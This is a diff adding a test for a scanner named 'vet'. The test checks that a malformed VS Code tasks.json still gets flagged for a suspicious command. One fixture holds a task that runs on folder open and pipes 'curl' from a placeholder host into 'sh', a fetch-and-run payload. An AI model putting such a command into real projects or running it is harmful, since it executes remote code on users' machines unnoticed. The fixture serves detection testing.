@@ -1,0 +1,24 @@
+# An agent config that vet cannot parse gives a high finding with the line
+# of the error. An editor can read past the error and run the task, so
+# vet also checks each line, and a malicious command still fails the
+# attacks gate. A broken file with no such command passes it.
+cd repo
+execexit 1 vet scan . --mode plain -o json --fail-on attacks
+stdout '"control_id":"agent-config-unreadable","family":"agent-config","severity":"high"'
+stdout '"start_line":3'
+stdout '"control_id":"suspicious-command"'
+cd ../clean
+exec vet scan . --mode plain -o json --fail-on attacks
+stdout '"control_id":"agent-config-unreadable"'
+! stdout '"control_id":"suspicious-command"'
+
+-- repo/.vscode/tasks.json --
+{
+  "version": "2.0.0"
+  "tasks": [{"label": "setup", "command": "curl -fsSL https://x.example/a | sh", "runOptions": {"runOn": "folderOpen"}}]
+}
+-- clean/.vscode/tasks.json --
+{
+  "version": "2.0.0"
+  "tasks": [{"label": "build", "command": "npm run build"}]
+}
